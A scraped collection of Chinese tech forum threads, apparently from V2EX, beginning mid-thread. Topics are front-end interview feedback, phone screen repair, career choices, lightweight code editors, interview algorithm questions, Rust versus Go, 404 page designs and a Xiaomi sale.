一问其他解决方案你就说有更好的方案，所以没深入研究（比如数组去重、原型链、移动端一像素）……给人感觉你各方面都懂一点，但是不精；\r", "②还有，你说你 [没做过啥具体项目] ，给人感觉缺乏实际经验；\r", "③你说你 [都是遇到问题再去解决] ，给人一种缺乏主动学习的能力；\r", "④公司使用的技术可能你用的少，比如 MAP 类型、 jsonp 、 NEW 对象 部分；\r", "⑤有一个问题，你说“原型啊，从哪里开始讲呢”，可能让人觉得你没形成知识体系，或者说掌握得不好， HR 后来更是直接说 [既然你原型不懂] \r", "⑥学历、专业问题\r", "⑦不知道其他问题（比如薪酬、福利待遇等）是否让 HR 产生别的想法\r", "⑧面试精神面貌：站直坐正，口齿清晰，声音洪亮，穿着得体，头发牙齿指甲胡须……\r", "HR 就是这样，把你问住了就觉得你有问题，问不住制造问题也要给你问住，这才显得优越感\r", "---------------------------------------------------------------------------------------------------------------------------------\r", "个人意见，仅供参考", "看到后面楼主说是非科班出身，那么这些面试题还是算比较高级的了，感觉应该得 8k 以上", "至于楼主回答有几个地方可以纠正一下，第一个是 jsonp 楼主你既然知道他返回的是一个参数为需要跨域传输的数据内容，那么无论是什么语言，你就算是字符串拼接能拼出来，那也是可以支持 jsonp 的。另外 html5 的新跨域技术是 cors 头部。", "还有 python 由于有 GIL 全局上下文锁，它的多线程本质上也不是真正的多线程，他比 node.js 好的地方在于 python 语法更优雅不用担心写 n 层回调函数导致代码阅读困难。如果楼主能和面试官谈谈这些那么就好多了。而且这些也都是我自己做着玩的项目以及刷各种公众号文章学到的，花不了多少时间。", "从这些地方可以看出楼主对于后端部分理解还有所欠缺，可以去看看一些主流前后端分离的开源项目源码和设计思路方面的文章了解了解。", " 没明白这为什么还要提醒一下我。。。我可是没说什么呀\r", "\r", "如果要来辩，可以\r", "LZ 写了 node 和 python ，作为前端工程师，懂点后端 这显然是平行领域突出的表现，可以换做是优势，这有什么问题？\r", "事实上，是面试官吊儿郎当 好吗？", "这些题目感觉不算简单了，居然只能拿 6k", "我就是一线 6k 的前端，在小公司 JQ 一条龙。手写分页，上传以及业务中一些主要功能。然而很多切图都切的不咋地的人能拿到 8~9k 。真的，在一线城市不仅仅要靠实力，还要靠忽悠。而面试的时候很多面试官问的东西都不知所云。。。还有直接问前端高并发处理的。", "在我看来。。真的这些问题全部都答得很好， 16k 都可以了。。。。不过我不是前端。。。", "是在一线城市面的吗？要是的话 6K 太少了吧。活不下去的", " 这种情况小公司很多，不太会分辨人", "日期写错了", "我觉得楼主还不错啊，这几天面试了好多没一个合适的。\r", "如果有兴趣来武汉工作可以发份简历给我 ", " 。\r", "公司网站 ", " ，轻小说平台。用的也就是 webpack + ES6 ，后台管理部分 Vue 。", "个人感觉 回答的比较模糊。嘿嘿嘿", "> Q : 我们这边后端用的不是 node ，是 java ，你怎么使用 jsonp 。\r", "> A : 啊， java 不能返回动态的 script 吗？我之前学过的 php 好像行，现在在学的 python 也行啊。\r", "\r", "jsonp 和 json 无非就是字符串，与语言无关，不存在 “ java 不能返回动态的 script ” 的问题，可是你的语气却不确定似的，“好像行” 减分项", " 稍微比楼主懂得多点。接受电话面试不？", "前端程序员们好厉害。", "倒数第三第四个问题的回答有问题\r", "\r", "主要是语气和态度上的问题\r", "\r", "面试嘛 不管懂不懂会不会静不精通   首先得把 B 装足了", "希望你面试的时候语气真的不是你所写的那样\r", "另外的确有点水（仅从从回答来看），我觉得自己比你扎实，但是找了个 3k 左右的实习就工作得很高兴了", "如果你不擅长言语。建议拿行动说话，搞一个维护良好的项目出来。放在 github 上。", "个人感觉，大部分回答比较模糊，没有深入到面试官想要的重点。", "楼主恰个微信？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>惨不忍睹~</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/zjvK2eu.jpg\"></p>\n</div></div>"], "reply": "19", "tittle": "一加 3T 屏幕坏了，有什么好的解决方式吗", "comment": ["买新的，别犹豫", "换新机把，大批新机发布会即将抵达战场，或者华为 p10?最近又不少把 1+卖掉换华为了😂搞不懂什么套路", "换上去的始终不如原装的。", "返厂六百不到换总成，淘宝两百换外屏。", " 手机刚买一个月", " 这是什么套路", " 问了下客服的确这么多，心疼", "半年前我的一加 3 ，京东售后转官网售后换的， 540", "50 包邮，其他的别说了。", "官网换外屏 544 ，回来贴膜加壳吧。", "你这是碎了，不是坏了", "51 包邮给你回回血", "把贴膜撕掉即可发现新世界", "200 包邮送我。。", "看到包邮的有种在贴吧的错觉", "600 块就心疼了？  那我的 iphone7 屏幕要是碎了，你猜得多少钱🙃", "50 到付", "100 到付，良心回血。", "心疼楼主。。。自从上次摔碎了屏后就感觉碎屏险的必要性啊。。不影响保修的话楼主还是自己换吧"]},
{"content": "", "reply": "目前尚无回", "tittle": "jdk 中有哪些类的 equals 方法重写有问题?", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>小弟刚毕业，初入公司，现在有两个选择： Android 组或者 Python 组。</p>\n<p>Android 主要是做封装 C++ Graphics Engine ，做成 SDK ，给产品组提供 API ，技术比较 Hardcore 。</p>\n<p>Python 主要是做 Django ，很正统 /传统的服务器段的业务逻辑，顺便带点 Performance 分析与改良。</p>\n<p>自己大学时候写过几年很多 Python ，而 Android 只有三个月经验。人幸好不傻，学的比较快。不知道该继续搞 Python 还是学学新的自己不太熟悉的 Android 。</p>\n<p>求职场达人带带路，给点建议，小弟的感激不尽。</p>\n</div></div>"], "reply": "28", "tittle": "初入职场，我是写 Android 还是 Python ?", "comment": ["学 3 个月就能写 JNI ，我好惭愧，我怎么觉得 JNI 好难....求指点学习技巧", "从跳槽考虑 个人认为 Python 好点， Android 个人不看好", "哪个钱多", "无言以对", "薪资第一，如果一样，看个人喜好和以后跳槽的成长了", "面向工资编程。", "兴趣第一，薪资并列", "刚入职场， python 你已经学过优点熟悉了，当然是去挑战 c++了，提升大，搞了这个之后，其他基本上都是 easy 模式，再说 python 你平时也可以瞎搞", "俩一起做~", "C++ Graphics Engine 的话 不限于手机平台 Android iOS 改改都能用", "公司是做什么的？哪个发展好呢？", "感觉你这 Android 组已经和 Android 关系不大了，语言更多的是 C++，逻辑更多的是图形引擎。这两个路子相对坑深，如果能认真钻下去的话更容易走成骨干（因为人少），负面效果是很容易把自己玩得越来越窄。\r", "\r", "Python 组的话，不知道你们公司服务端规模大不大，业务有哪些。企业内部应用增删改查也可以叫服务端，亿级后台也可以叫服务端。\r", "不过总的来说，服务端舞台更广阔一些。虽然使用的是 Python/Django ，但能学到的大部分技术、思想其实和语言、框架、业务无关，是通用的。\r", "另外一个比较小的点，毕业生能利用自己有限的经验快速表现，得到老大的认可和持续栽培，在大公司也很重要。路遥知马力，但毕竟第一印象也很重要。\r", "\r", "拙见。", "封装 sdk 有技术含量吗 =   =", "来我司写 Python 吧，还有 Ruby 可以选", " 主要还是 Android ，封装 API ，图形引擎 C++是另外一个组在做。 Python 组服务器是亿级的，但是感觉广阔而又传统。\r", "\r", " Engine 是 cross-platform 的， Android, iOS 都在用，但是 Android 组主要做 Android 端封装 SDK 。\r", "\r", " @", " @", " 同一个公司，工资一样的呀。", " \r", "当然是 Python Django, Python measurement/monitoring. 然后往互联网 backend server, distributed system, devops, big data, 甚至是 machine learning 这一条科技树上走，这条路线上随便开新技能，都是今后热点有钱途领域. \r", "\r", "Android, iOS 本来就窄而且受限于 vendor lock ，你还在下面搞所谓 hardcore 图形引擎 API ，基本就是坑中之坑, 直白说就是脏活累活. 想用 C++ 搞 graphic, 自学就是, 可能比你去你公司维护升级别人的 legacy C++ graphic engine 还学的快.\r", "\r", "Python Django 和 low-level C++ graphic 都搞过的人给你的建议.\r", "没事不要给自己开 hard 模式，然后还觉得有成就感，那个就是操着卖白粉心，追着卖菜的钱途.", " 能私信联系下请教下经验吗？我能讲讲更详细公司的情况。我邮箱是 ", " 。", "人生苦短~", "人生苦短～", "上面不少人应该还年轻，这样说吧，如果家庭条件好或者出生在一些城市，可以随意发展，如果不是的话你的人生只能靠你自己，首先要评估一下自己的能力，如果在一线城市，自己在这个领域能不能做到超一流，不能的话你可能要退回二线或者三线四线，需要本地找工作，到时候你会发现那些前沿科技高大上的技术毫无用处，那些原本冷门的技术倒是能跟一线城市保持一样的薪资水平", "人生苦短  及时 python", " 那感觉一般啊。", " 冷门技术是指？高大上又是指？\r", "\r", " @", " @", " 动态类型一时爽，代码重构火葬场。我自己也用 python 好几年，对 python 有爱。但是百万行 code 的 python code 修起来，那很酸爽。 Python 的库用起来也没有 static typed 的库方便好用。", "楼上的意见都很中肯，不过我个人认为，要想立足就得有老板忌惮你的能力，这样你的出路才宽阔，不管安卓也好 py 也好，总之选择了就专精它，普通的一件事你做到极致也是一种成功", "Python 好一点，不太看好 Android", "国内 python 路太窄。当然我同意做后端更有钱途。", " 冷门说的是相对于现在的一二线城市的大热，高大上就是一二线城市的主流技术，因为一二线城市把一流的人才都吸纳过去了，下面小城市的公司根本没有足够的人才来支撑，也没有实力去在互联网行业与一线城市竞争，所以这些城市别说现在新流行的 go 、 rust 的之类看不到，就连 python 的职位也可能一个都没有，就算有一两个也可能就是打打酱油薪资很低的那种，从北上广的人回来一看空有一身本领无处施展很是尴尬，这些城市主流的可能是 c 、 c++做一些冷门的开发，比如偏向某些行业嵌入式方面的，互联网一大片基本上都是 php ，稍微好点的公司用 java", "求你来别来做安卓了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最开始用 sublime,确实很轻量，想买又太贵了。。。用免费的经常弹窗，比较烦。\n转向 atom ，感觉一切的都好，只是 chrome 多打开几个标签页，或者电脑上有多个大一点的应用时，就会卡住.</p>\n<p>i3, 4G 内存， gnome 桌面。</p>\n<p>求推荐轻量级编辑器， vim 就算了，玩不转</p>\n</div></div>"], "reply": "110", "tittle": "Atom 太重了，渣渣笔记本，求各位大虾推荐轻量级编辑器", "comment": ["又一页了？", "\r", "\r", "\r", "這 3 很好用，特別推薦前兩個！", "brackets 应该也是 atom 类似的技术做的，还是比较卡的。 sublimetext 就快的太多了", "换新电脑就装 vscode ，现在还是用 atom 顶顶吧", "gedit ， nano", "vscode\r", "和 atom 一样，但是不吃内存", "ssd", "emacs", "作为 emacs 高级用户，应该用 emacsclient", "sublime 激活码一大堆"]},
{"content": ["<div class=\"topic_content\">我先来\r<br>\r<br>堆排，快排\r<br>翻转二叉树，二叉树两个节点的最低公共祖先节点\r<br>\r<br>你们呢</div>"], "reply": "30", "tittle": "你在面试中遇到过哪些算法题？", "comment": ["二分查找。。。。然后关键我当时没写出来，现在都没搞懂当时在想什么。", "想起来以前被面国一道 fft 的题，感受到慢慢的恶意", "LRU ，哈希表", "打印任意大小矩阵的，外圈顺时针的内容……", " 哪个公司这么牛逼，还面傅立叶变换，大写的服。", " 其实递归就能解。", " 主要是如果候选人不是 EE 或者 CS ，估计连 fft 是什么都不知道。", "二叉树的遍历，冒泡问得最多。其他的就一些简单的统计数字之类的。", "设计个加法器。。。如果算算法的话", " 那不是数电里的内容吗？", " 快速傅里叶变换啊，大三的时候《数字信号处理》专业课讲过。傅里叶变换运算量太大，当时计算机根本处理不了，后来就有人设计了 fft 。不过，知道毕业我也没能理解这算法是怎么工作的", "红黑树…\r", "我 tmd 当场跪倒", "阿里的凸包问题= =", "快排 and 堆排\r", "二叉树\r", "再难 B 树不能再过分了\r", "难度在这以上的话，一般能答出就是加分项吧", "整数数组排序，奇数在左，偶数在右", "栈内获取最大的数  O(1)", "只要非平衡的二叉树，都还好吧。", "H3C 笔试遇到了实现一个 LRU\r", "\r", "但我觉得我遇到的最难的一个是 ", "单链表排序实现", "插入排序的变种", "LRU 也挺考人的啊，复杂点的数据结构反而好点。。。", "红黑树删除，一时半会真是手写不出来啊……", "说个最近的吧……\r", "最长回文子字符串\r", "\r", "P.S.所谓最近是 5 年前……", "  不考虑复杂度的话，，应该不难", " 考虑平均复杂度", " 这样说吧 ， fft 可以用来算高精度乘法，还有各种变形", " g 家", "红黑树。。。。。", "手写快排，二分查找", "红黑树和平衡二叉树"]},
{"content": "", "reply": "100", "tittle": "Rust 和 go 哪个更有前途？", "comment": ["这种提问，你应该去知乎。\r", "\r", "慢走不送", "Go", "能写好这两个的人感觉都蛮有前途的", "Go 已经过了泡沫期，往低谷期发展了， Rust 还在上升期", "rust 那 tm 难入门了", "不谈需求讲语言都是扯淡", " 大哥，怎么是低谷期了，不是正上升呢", "菠萝和葡萄哪个更好吃", "一直觉得 Go 是个框架附带语言，写什么都很方便轻松，但语言就很弱。而 Rust 感觉真的是在做语言，很多特性很棒。但是如果能像 Go 一样自带大量电池就好了。\r", "\r", "可惜 Rust 貌似不会向那个方向发展，只想单纯做个语言，其他的交给社区。\r", "\r", "所以这两个语言真的可爱又可恨。（最后还是觉得 C 和 C++最棒", "C++最有前途  逃...", "这两语言有共同点吗……", "rust 和 c 艹是一类语言，用的地方都不一样", "虽然不是同一领域的语言，但我还是觉得 Rust 要比 Go 更「好」，得出这一点是因为我觉得 Go 没有找到一个十分适合的场景。\r", "\r", "Rust 显然是瞄准 C++ 去的，零开销抽象、内存安全、类型安全，最后能否替代 C++ 不好说，但至少是有可能的，这可是一个非常大的领域，包括操作系统、浏览器、编译器和虚拟机、图形引擎这些重量级的使用场景。\r", "\r", "Go 的话定位就非常尴尬了，和 Python / Node.js 比起来抽象能力太弱（指的是提供的语言特性较为有限，例如异常、泛型、完整的面向对象），面对复杂多变的业务需求显得不那么够用；静态类型当然也有其好处，但似乎并没有比例如 Java 这样其他的语言强多少。从 Go 没有异常这一点来看，可能更适合系统编程（而非业务代码），确实 Go 也被用来一些网络中间件。但 Go 却又是有 GC 的语言，和 C 的互操作又不够高效，导致在系统编程的使用场景也非常狭窄。\r", "\r", "Rust 粉路过， rust 生态还不完善，也不敢跟 golang 比", "go 对写 go 的人来说是招式加成，对其他领域的人才能有内力加成（这类的人起码有 5000 小时的进度）。\r", "rust 对所有人来说都有内力加成。", "还没有见过比 java 更有前途的， 10 个公司 9 个用 java", "java 停止进化了，不睬， go 开始发光发热学学挺好的，对 rust 内心有种冲动，目前没掌握有时间也要学学。", "你要去看看这几门语言是谁领导的。这门语言的出发点在于什么。每个语言都有不同的特性和用法、用处。\r", "\r", "go 来自于 google ，主要发展也是根据 google 自身的需求和其他贡献者添瓦决定的。\r", "rust 来自于 mozilla ，主要用于创造程序，说是来自于 c++比 c++更加 memeory safe ，可能是瞄准 c++的市场，准备大干一番吧。貌似可以省不少 c++ coder 的脑细胞。\r", "\r", "虽然 go 编译后的文件也是可以直接运行的，看上去很爽，但是相比 c++还是有点差距。", "Go 有一个逼格极高的好爹啊……", "Go 生态很完善了，基本上你想要的类库都能找到现成的。", "都很有前途，不用你操心。你应该操心的是，学哪个更有前途？\r", "这两门语言要面对的场景、解决的问题不一样", "PHP", "java ，上个培训班就能找工作", "Rust 好像有点反人性，很多地方写起来会痛不欲生吧", "先用 rust 写个链表压压惊", "golang  至少还能找到工作  虽然少，但还是有盼头", "目前用 go 做后端,还不错,程序跑得很欢,很省心的样子.\r", "rust,那语法,感觉还是 C++方便些", "一直都在趴老语言。这些新的玩意还没玩过，最近又开始玩 C/C++了。\r", "就目前就业来说，这两个非一线及互联网比较发达的城市基本无人招了，所以如果为了找份好工作，还是结合下自己所在的坐标，做出正确的选择把", "用 go 做 web 管理和 app api 很好用。适合自己的是最好的。适合企业的是最好的。适合地区的是最好的。二线城市没听过 rust 但是有 go 的身影", "Rust is a systems programming language", "PHP 是世界上最好的语言！没有之一！", "最近 elixir 好像没有声音了", " ", " 哪天发现不挣钱，弄死也不奇怪，毕竟广告公司挣钱是第一目的。", "我选 Kotlin", " 似乎还行啊，各种 Conf 搞的飞起，油管上视频都看不完", " v2 上好像没有咋讨论", "我选 go 因为阮老师是 rust 粉 蛤蛤", "go 写 web/api 还是效率挺高的。\r", "\r", "用过 php/node/python 做过 Web\r", "\r", "目前还是 go 的效率最高。", "都没有,  不信就去二三线城市找工作看看", "\r", " Go 何来挣钱一说？\r", "一切都是开源的语言，怎样弄死？\r", "老兵不死，只是凋零。", "光会语言还不是搬砖工，至于比来比去吗", "Rust 不看好，爹不行，做了多少东西没弄出来。最终也只能是一个小小众的语言！", " \r", "\r", "语言和爹关系不大。\r", "\r", "推出的时间，成功的项目更重要下些。\r", "\r", "go 要不是有个 docker 成功了。现在估计也就那样了。", "选择 Java 的公司大概是这样想的吧， java 很挫不要紧，堆钱堆机器堆人力，招人便宜，业务需求满足成本低", "1 、 firefox 准备换新引擎 servo 是用 rust 写的， rust 的大型项目还有操作系统 Redox 。\r", "2 、 rust 之父被 apple 挖过去做 swift 了。\r", "3 、 go 和 rust 的应用场景不同，最好能够都掌握。", " 那问题来了， Docker 为什么要用 Go 而不用 C ？", "Dart 才是 Google 亲儿子，怎么就普及不起来呢.....", "我认为 Rust 希望很渺茫啊。它瞄准 C++，但 C++并没有什么致命的缺陷，何况 c++也在不断进化之中……", " \r", "\r", "webadmin 为什么用 perl 不用 python ？\r", "\r", "ror 为什么用 ruby 不用 Python?\r", "\r", "\r", "\r", "因为作者喜欢，环境又支持。", "难道你们还不知道 php 是最好的语言吗", " 还是你走吧！ P 用没有占一楼，要脸嗎！", " 效率是写的效率还是运行效率？", "Golang ，看社区的火热度。", " \r", "\r", "写。\r", "\r", "运行效率感觉和 Nodejs 拉不出很大差距的。", " 写代码速度 比 python 还快？", " \r", "\r", "我写 go 的速度比我写 python 的快。\r", "\r", "这个写包括 debug 。\r", "\r", "可能是我写 python 的姿势不太对。", " 我来学下看下。。", " \r", "\r", "这个只是和个人写代码风格有光……\r", "\r", "至少写的不慢是真的。\r", "\r", "可能我当年是静态语言入的门，受第一印象影响比较大。", "rust 和 go 哪个更有前途这是个伪命题，应用场景完全不一样。\r", "不如问：搞 rust 和搞 go 哪个更有前途？\r", "\r", "我的看法是 go 适合做一些中间层，也可以是应用层， go 在运维层面的发展绝对是阻止不了的。\r", "rust 更底层，该写系统写系统，该写数据库写数据库。\r", "java/python/php 还是搞应用吧。", " 我第一门语言是 C#", "erlang 比较有前途", "感觉这两个语言我都有点发言权...\r", "\r", " 的观点很正确.", " 我脸皮厚", " 这话问的，因为作者选择了 go ，为什么会选 go 有可能是喝醉了，与不用 c 没啥关系，这个东西用其他语言都能做", "rust 语言 github 上 star 大于 10 的项目数:2139  （ ", " ）\r", "go 语言 github 上 star 大于 10 的项目数:12318  ( ", ")", "RUST 学习曲线太陡峭了，而且很多时候内存安全并没有那么重要", " 不不，任何时候内存安全都很重要。很多时候性能没那么重要所以还是用 GC 好。", "Rust 保证没有数据竞争，这一点带 GC 的 golang 目前不保证。", "\r", "那假如你是作者，你会选 Java 、 Python 、 PHP 这些语言来做吗？\r", "作者的喜好是一方面，语言能高效地实现预期目标又是一方面。这根本就不单单是作者喜欢什么语言就能用什么语言的事。", "Docker 这种系统程序，不用 C 而用 Go ，这本身就很能说明问题了。", " 你说的为什么不用 c 好不好？你真搞笑，什么这种系统程序不用 c 用 go ，还本身说明问题，因为原本 docker 下面一大堆都用 c 做好了， docker 就是躺在上面的，早期的 container 都是 lxc 的，按照作者初期的想法，用 python 和 c 写不奇怪，选择了 go 也正常， go 跟 rust 除了都是新的语言外真没啥可比较，跟 c 就更不用说了， go 主要是针对 java 和 python 领域的， rust 奔着 c/c++去的", " docker 又不底层有什么必要上 C", "大部分常见的业务不需要 rust 所谓的优点 qaq", "金字塔顶尖的语言。 c  c++", "Rust 纯属炒作\r", "Rust 属于 mozilla ，是谷歌微软苹果的直接竞争者\r", "大牌公司不会接受 rust\r", "自然不会有什么前途", "Rust 毕竟新游戏,画质和可玩性都更强,现在也有很多国内主播在推\r", "CS:GO 嘛 群众基础毕竟大  玩法比较单一\r", "\r", "两款游戏没有可比性.", "我选 Go\r", " \r", "Rust 关键字缩写太蛋疼", " Rust 这款游戏入手太难，带入感差，注定了玩家少，生态建立缓慢\r", "GO 虽然玩法单一，但是入手容易，出活快，缺点虽然多，但是风格突出，吸引大批玩家", "我工作上用的第一门语言居然是 asp 。\r", "\r", "asp -> asp.net(c#) -> php -> node.js -> go -> php", "都学，技多不压身", "\r", "RUST 开局裸屌，被全副武装的追着打。小公司没有宣传能力，全靠玩家口口相传。\r", "GO 开局什么武器都有，最多买个皮肤。还有爸爸支持，每年砸钱办比赛，然后诞生了不少职业选手。", "你能用哪个做出东西、挣到钱，哪个就有钱途。", " 并不觉得 Java 特别有前途。它和 OOP 捆绑得太紧了。", "我力挺 Rust ，并且已经在我厂上线了 Rust 写的服务。怎么说呢，别的语言补完测试扔 线上还要担心会不会有意外的 coredump ， nil pointer 之类，用 Rust 写的东西从来没担心过。它的表现也让我兴奋，从来没出过问题。\r", "\r", "我爱这个语言！", " 炒作？也不知道一个专注于语言自身开发把生态交给社区的团队炒作什么了，论炒作怎么也比不过广告公司", " 哥！公司还招人吗？ Rust 和 Golang 我都会。\r", "\r", "只是学了 Rust 后，着了他的魔，再也不想写 Go 代码。无奈现在 Rust 工作机会太少。", "别说了， php 吧", "新公司用 go 的，简单的用了下，感觉在偏业务的应用用 go 不太舒服，可能我之前是纯面对对象的思想，一时间转不过来吧", " 我司一直招人，但是我们组 HC 有限…非常抱歉…", " Rust 里面新人得光着屁股到处被砍不太好\r", "还是 GO 里面 RUSH B 比较朋克", "go + c > rust 应该能够成立的吧", "Go 就适合一种场景，几十万甚至百万级并发长连接，业务复杂，耗时以等待 IO 为主，单个请求会多次请求别的服务，且每次都花很长时间等待 IO 。", "go 呢  google 不是有开源项目  把 python 代码 直接编译成 go 么 \r", "如果那个到实用阶段 rust 干得过么  哈哈", "啊弥陀佛  老衲又着相了  我改 你好我好 大家好 用得好才是真的好", " go 没有泛型 c 也没有，然而 rust 可是又的啊。。", " 泛型统治治不了全宇宙啊", " 所以需要多范式啊， C++就是，所以。。。", "果然一提语言之争大家都打鸡血似的～"]},
{"content": ["<div class=\"topic_content\">最好的个性化的 ,一个页面的.....</div>"], "reply": "78", "tittle": "求 v 友分享几个耀眼的 404 页面!", "comment": ["公寓 404 。。", "宝贝回家\r", "ft.com404 页。没见过比那个更详细的分析……", "俺的 blog 的：\r", "楼上大佬好强。。分享一个自己的，设计感比较弱😂： ", "Javascript Page404 Colour Screen    ", "404_优设站内搜索\r", "\r", "\r", "超实用！不容错过的优秀 404 页面设计指南\r", "打死白学家", " 打死白学家", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "怎么没有知乎提问题的那个页面", " 第一个简直是精神污染...", " 很不错的 404 页面，学习了", "好吧，我说的是公益 404 不是公寓。。", " 好吧，抱歉给你带来精神上的不适……\r", "\r", "\r", " “分享是一种美德，是一种态度。”（出自马甲大佬……）", " #14 \r", " #17 \r", "已经不止是精神污染的事了，有可能引起癫痫的…… ", " 猝不及防⊙﹏⊙", " 来卖个萌", "我的思路是在 404 嵌入一张 unsplash 随机图", " \r", "从 codepen 上弄来的改了下文字....", " ", "亮个相~~  ", " 老哥稳，螺旋稳", " 老哥笔名少女？", "我的很简单。。。\r", " 这个厉害了……", "我的都不好意思分享了，马上重新做一个 404 页面", " 你帮他说一遍，等于你也……", " ", " 来必立的官网的字体是什么鬼？", " #12 溜得一批 ...闪瞎我的眼..", "留下博客求大佬参考推荐一下什么好:www.ydxred.com", "\r", "\r", "开个车", " 我的眼睛= =", "竟然在这发现了自己的博客", " 我就猜一定会有飞机场图片", " 666", "404 优秀设计案例展示收集站点： ", "\r", "\r", "我觉得 404 应该也要简单点。\r", "我导航的 404 ： ", " 比较简洁。", " 设计不错， 求开源地址", " 又顺便看了你的简历，居然和我一个高中同学，同一个学校同一个专业同一年的，哈哈哈，不知道是否人生 dongyuan", "说耀眼我真没见过比 80host 的 404 更耀眼的。。", " 已瞎", "哈，这主题好", " 打死白学家", "\r", " dongyuan 嘛 一个班的 233 确实很巧 你问她她也应该知道我是谁 www", "你们就不能学着 v 站朴素点？ wwwwww\r", "\r", "还是这个吧\r", "\r", "\r", "\r", "后面随机一个，因为缓存挡住了装逼的一点气势", "\r", "小黄人快版音乐，小黄人欢乐歌唱，跳舞的，，，，", " 见笑了……\r", "\r", "\r", " 抱歉了，仁兄", "  ", "  我就是凑个热闹", " 哈哈，刚才问了。我说你识不识得这女装大佬😂，她说大学的同班同学。", " 想我高中的时候还喜欢过她好一阵呢，哈哈，后来觉得她的脾气还是挺折磨人的😛哈哈", " 另外，大佬的网站挺不错的，内容很丰富，也很简洁漂亮，我本科也是学硬件的，今年也开始转前端了，不知道研究生这两年能不能能不能转成功，哈哈", " #12 第一个好刺激。。。", "我反正是抄的。。。没什么想法\r", " 我也觉得真刺激…… 😂", "是时候晒一波自己的网站了", "是时候把自己的扔出来了😂 ", "另外推荐汤不热上这位博主，收集的 404 够看好久 ", "\r", "慢慢找，别着急", "紧赶慢赶画了一个： ", "前几楼评论的 404 页面，看起来完全没了 404 的意思，更像被劫持跳到其他网页", "分享一个前公司的 ", "weibo.com/sorry", "无形之中被开车了...."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>其实去年 9/10 月买了 360 的 n4s,刷 root 之类的坑爹,rom 也少,看着乐视华为魅族耍猴.还不如回到他们的祖宗哪...</p>\n<p>360 云盘一些事情过后对 360 已经无爱~</p>\n<p>小米 6 等不起,小米 5S 除了指纹糟点(听说更新后好了不少)也没什么可挑剔的,性能也够,准备入坑  ~</p>\n<p>不过 3G 母鸡够不够用,京东有 4G+32 +128 的 不过没货, 小米商城和天猫都只有 3G+64 的 降价大概 1799?</p>\n<p>抱拳~自行忽略了官方的优惠券,耍猴根本抢不到..</p>\n<p>嗯顺便带一波小米手环 2,看着还可以哇,评价还好 颜值不错~</p>\n<p>嗯话说你们喜欢用花呗还是用小米自带的分期?嗯我看嗯到时候看看嗯.~</p>\n<p>其他的.. 没看出来有啥可买了  看看 v 友们能搞出来啥子`</p>\n<p>抱拳~</p>\n</div></div>"], "reply": "61", "tittle": "小米米粉节倒计时 3 天,在坐的各位有没有想买点啥的?", "comment": ["想买个厨下式净水器，但是好像有的说出的废水率太高，还在犹豫", "MIUI  3G RAM 感觉小了点，经常只剩三四百 M", "我想要几碗面", " 刷安卓原生就好", "本质的区别，没便宜多少。何必剁手", "5S   我在用。", "买个灯泡，研究一下控制方法。", "扫地机，移动电源", "原本打算买 Note 4X 高配的，现在。。呵呵。你妹", " 说出你的故事", "搜索 奇葩说 有红包，现金，", " 用过一年的原生安卓，又用回了 MIUI ，主要是 MIUI 相机好用，其他的都有替代 APP", "那个助力的自行车挺好看的", " 3K 了.. 略贵了.. 舍不得", " 我以为只有一次的.. 又多了几张.. 不过一次不是只能用一张么..", "想换个红米 4 ，然而特么要出去俩星期没人接快递，夏季再说，反正现在手机就是续航差点没别的毛病", "想买行李箱，但是没有优惠~", "我是从小米转了华为，但觉得小米功能确实挺不错，但系统稳定性差，", "对讲机，半价~~", " 直接米 6 了", " 没钱，也没闲心抢手机，反正红米千元也够用了", " 配合 homebridge 棒棒哒 可以复用家里的 raspberry pi 或者装在 nas 里", "5S 4G 中国版 MIUI 剩余 2.2G 全球版 MIUI 剩余 2G", "如果离公司不远自行车你值得拥有", "小米电视 4", " 昨天去米家维修点，堆了至少 10 台扫地机。\r", "\r", "看到其中一个问题描述：开机后只会原地打转。", "准备买个路由器", " 行李箱不推荐，质量并不好", " 但是我看很多人在这个价位都推荐 90 分啊，我说的是 20 寸的", " 我的小米行李箱第二天就坏了，可能有过载的原因不过不应该坏得这么快", " 坏了去修了不？", " 拿到国外去了……", " 。。我还想了解一下售后", "没啥值得买的", " 哪怕是 625 也好", " 慎买，只能这么说了。。。小米路由器是我用过所有小米产品之中，最黑的产品，都不需要别人来黑了。用到怀疑人生。。。", "紫米移动电源，等了好久都没有 79", " 京东自提啊，出差地点附近自提点", "我觉得扫地机挺好的。还有净化器。", "移动电源不知道有什么优惠没", " 我怎么用的那么好…感觉比市面上同等价位质量好多了…", " 小米就是这么奇妙的东西.. 我爹用着小米 2s 也感觉小米就是辣鸡.. 不过性价比和没得选... 我还是回到了米粉群众", "小米旅行箱", " 同样的价位同样的产品，我一般优先选择小米，毕竟好多品质确实不错，安卓手机一般默认小米魅族，苹果就不解释了，系统硬件不是一个档次的，几年前 5s 都比小米 5s 划算，软件兼容性稳定性流畅性好多了", "估计会买一些小东西吧......新出的鼠标看起来还不错,移动电源也可以......扫地机器人的话,现在还没房子,小米笔记本等着下一代,嗯嗯", "两年前买过一个绿色路由器  现在还好好的", " 我不少同事都买了都说很不错啊", " #36 广告吧", "5 折那几款都值得买", "Note 4X 高配居然就是一 x20 ，没兴趣买任何东西了", "我想买个机器人，家里的 irobot 太不省心了。", "扫地机器人，我买点配件。 用起来还是方便的", "有人买过米家的智能摄像头吗，貌似小蚁的不在小米官网上卖了", "打算买运动摄像机。。。老外评测都不错", " 匿了，竟然不是小米的", " 没错，我家俩路由器居然都是小米，说它垃圾都侮辱了垃圾", "想捡便宜可以到咸鱼上找给二手东退货做分销的，运气好可以找到仅开封未使用的，价格好，京东配送。", " 我用的是小米路由器 3 ，其他就不评论了，价格比其他款的要贵（那时候是除了硬盘版的最贵），功能插件介绍的都是硬盘版的，特别是插件，只有普通的三个没有用处的三个插件，其他路由器都是没有的。无线的范围比 TP-LINK 和其他的差太远了。你去小米社区看看就知道了。", " 好的，我再看看。我买了不少 TP link 的都不咋样，听同事说小米的路由器很不错", "没钱根本不知道啥时候是米粉节...", "刚刚入手了一个 小米车载净化器，感觉没多大用！"]},
